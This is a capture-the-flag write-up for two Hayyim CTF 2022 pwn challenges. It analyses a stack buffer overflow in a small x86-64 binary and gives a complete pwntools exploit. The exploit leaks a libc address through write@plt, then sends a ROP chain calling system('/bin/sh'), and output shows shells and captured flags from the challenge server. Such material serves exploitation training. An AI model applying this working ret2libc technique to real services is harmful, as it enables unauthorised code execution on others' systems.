# Hayyim CTF 2022

## warmup

> What a tiny program!
>
> `nc 141.164.48.191 10001`
>
> [`Warmup_2eba252bc81213a4a232487f6d2ceeeb5dbbd5ace12641e4d8af82dc56104ff5.tgz`](Warmup_2eba252bc81213a4a232487f6d2ceeeb5dbbd5ace12641e4d8af82dc56104ff5.tgz)

## cooldown

> input size has decreased.
>
> `nc 141.164.48.191 10005`
>
> [`Cooldown_b6e153efcb71172289fc860c0bf9af90f63ec80b72f0644370a43d6a47aabff4.tgz`](Cooldown_b6e153efcb71172289fc860c0bf9af90f63ec80b72f0644370a43d6a47aabff4.tgz)

Tags: _pwn_ _x86-64_ _rop_ _bof_


## Summary

Warmup and cooldown are exactly the same problem only differing by size of input buffer.  I used the exact same code on both, so I'll only cover cooldown.

In short, use `write` to leak libc, then on second pass get a shell.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE will make it easy to call GOT functions and ROP, however Full RELRO will prevent modifying the GOT.  No canary, well, this _is_ a BOF/ROP challenge.


### Decompile with Ghidra

```c
void FUN_0040053d(void)
{
  long lVar1;
  undefined4 *puVar2;
  undefined4 auStack56 [12];
  
  puVar2 = auStack56;
  for (lVar1 = 0xc; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  write(1,&DAT_0040057e,2);
  read(0,auStack56,0x60);
  return;
}
```

`read(0,auStack56,0x60)` will `read` up to `0x60` (96) bytes into a buffer only `56` (`auStack56`) bytes from the return address--there's your problem.  This gives us 40 bytes to craft an exploit--we only need 24.

`FUN_0040053d` (above) is our vulnerable function and is called by `entry`:

```
void entry(void)
{
  FUN_004004f9();
  FUN_0040053d();
  exit(0);
}
```

From the `entry` disassembly you can see that after the call to `FUN_0040053d` we'll return to `0x4004f2`:

```
undefined entry()

004004e0 48 83 ec 08     SUB        RSP,0x8
004004e4 31 c0           XOR        EAX,EAX
004004e6 e8 0e 00        CALL       FUN_004004f9
         00 00
004004eb 31 c0           XOR        EAX,EAX
004004ed e8 4b 00        CALL       FUN_0040053d
         00 00
004004f2 31 ff           XOR        EDI,EDI
004004f4 e8 d7 ff        CALL       <EXTERNAL>::exit
         ff ff
```

If you set a break point after `read(0,auStack56,0x60);`, you'll see that same return address on the stack and below that an address we're going to leak to get the location of libc:

```
0x00007fffffffe408│+0x0000: 0x0000000a68616c62 ("blah\n"?)	 ← $rbx, $rsp, $rsi
0x00007fffffffe410│+0x0008: 0x0000000000000000
0x00007fffffffe418│+0x0010: 0x0000000000000000
0x00007fffffffe420│+0x0018: 0x0000000000000000
0x00007fffffffe428│+0x0020: 0x0000000000000000
0x00007fffffffe430│+0x0028: 0x0000000000000000
0x00007fffffffe438│+0x0030: 0x0000000000000000
0x00007fffffffe440│+0x0038: 0x00000000004004f2  →   xor edi, edi
0x00007fffffffe448│+0x0040: 0x00007ffff7dd40ca  →  <_dl_start_user+50> lea rdx, [rip+0xfa6f]        # 0x7ffff7de3b40 <_dl_fini>
```

That location has a side benefit, it will jump back to `entry`:

```
gef➤  x/3i _dl_start_user+50
   0x7ffff7dd40ca <_dl_start_user+50>:	lea    rdx,[rip+0xfa6f]        # 0x7ffff7de3b40 <_dl_fini>
   0x7ffff7dd40d1 <_dl_start_user+57>:	mov    rsp,r13
   0x7ffff7dd40d4 <_dl_start_user+60>:	jmp    r12
   
gef➤  p $r12
$1 = 0x4004e0
```

So we get a free roundtrip, to leak this we simply need to overwrite the return address (and nothing else) with `binary.plt.write`.

`write` requires 3 arguments, FD (`rdi`), buffer address (`rsi`), and length (`rdx`).  All three are set by the previous `read` call.  Basically we're just going to write `0x60` bytes starting at the `read` buffer.  This will leak the location of `_dl_start_user+50` and we can use that to leak libc.

> _But `rdi` is `0` not `1`, isn't `0` `stdin`?_
> 
> Yes it is, but these are just conventions.  From your shell type `echo nothing >&0`, see, you got `nothing`, which is actually _something_.

With the leak and a second pass, we can just write out a simple ROP chain to get a shell.


## Exploit Development Environment

From the included `Dockerfile`:

```
FROM ubuntu:18.04
```

I just used an Ubuntu 18.04 Docker image for exploit development.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./cooldown', checksec=False)

if args.REMOTE:
    p = remote('141.164.48.191', 10005)
    libc = ELF('./libc.so.6', checksec=False)
else:
    s = process('socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./cooldown,pty,setsid,sigint,sane,rawer'.split())
    p = remote('127.0.0.1', 9999)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
```

pwntools header.

> I'm using `socat` vs. `process(binary.path)` since pwntools `process` does not deal well with output being written to FD `0`.  I do not know of an easy way to fix this with pwntools so I just start up `socat` and then connect to that.

```python
payload  = b''
payload += 56 * b'A'
payload += p64(binary.plt.write)

p.sendafter(b'> ',payload)
p.recv(len(payload))
```

As mentioned in the Analysis section, we're just going to send `56` bytes to get to the return address and then overwrite that with a call to `write` from the PLT.

Then we just need to receive our payload, ignore it and move on.

```python
'''
stack:
0x00007fffffffe448│+0x0040: 0x00007ffff7dd40ca  →  <_dl_start_user+50> lea rdx, [rip+0xfa6f]        # 0x7ffff7de3b40 <_dl_fini>

vmmap:
0x00007ffff79e2000 0x00007ffff7bc9000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 0x00007ffff7dc9000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 0x00007ffff7dcd000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 0x00007ffff7dcf000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd3000 0x0000000000000000 rw-
0x00007ffff7dd3000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
'''

libc.address = u64(p.recv(8)) - (0x00007ffff7dd40ca - 0x00007ffff79e2000)
log.info('libc.address: {x}'.format(x = hex(libc.address)))
```

The next 8 bytes will be the location of `_dl_start_user+50`.  The comment section above is my GDB stack and vmmap info.  We just need to compute the difference from the GDB stack leak to the base of [vmmap] libc and then subtract that constant from our remote leak (`u64(p.recv(8))`)

```python
pop_rdi = libc.search(asm('pop rdi; ret')).__next__()

payload  = b''
payload += 56 * b'A'
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

assert(len(payload) <= 0x60)

p.sendafter(b'> ',payload)
p.interactive()
```

Finally your everyday ROP chain given you have a libc leak.

Output (warmup):

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to 141.164.48.191 on port 10001: Done
[*] libc.address: 0x7f7306204000
[*] Switching to interactive mode
$ cat flag
hsctf{0rigin4l_inpu7_1eng7h_w4s_0x60}
```

Output (cooldown):

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to 141.164.48.191 on port 10005: Done
[*] libc.address: 0x7f94b44b0000
[*] Switching to interactive mode
$ cat flag
hsctf{ACB31ABDE038159C3D7949CFC01CE100}
```
